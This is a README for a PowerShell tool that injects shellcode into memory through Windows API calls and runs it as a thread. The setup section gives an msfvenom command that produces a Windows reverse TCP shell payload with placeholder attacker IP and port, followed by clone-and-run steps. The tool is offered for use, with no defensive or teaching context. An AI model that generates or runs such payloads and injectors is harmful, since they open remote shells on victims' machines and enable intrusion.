# PowerShell Shellcode Injector

## Description
This project provides a PowerShell script that uses Windows API functions to inject shellcode into memory and execute it as a separate thread in the system. The script utilizes functions from `kernel32.dll` to allocate memory, create a thread, and wait for the result.


## Create ShellCode
- Change the line 37.
- msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT -f powershell

## Features
- Allocates memory using `VirtualAlloc`.
- Creates a new thread to execute the shellcode.
- Uses the `WaitForSingleObject` API to wait for the thread to finish execution.

## Installation and Usage
### Requirements
- PowerShell 5.1 or higher.
- Administrator privileges on the machine to allocate memory and create threads.

### Setup
1. Clone the repository:
   ```bash
   git clone https://github.com/thangcongtran/Reverse-Shell-Powershell.git
   cd Reverse-Shell-Powershell
   .\Reverse-Shell-Powershell.ps1
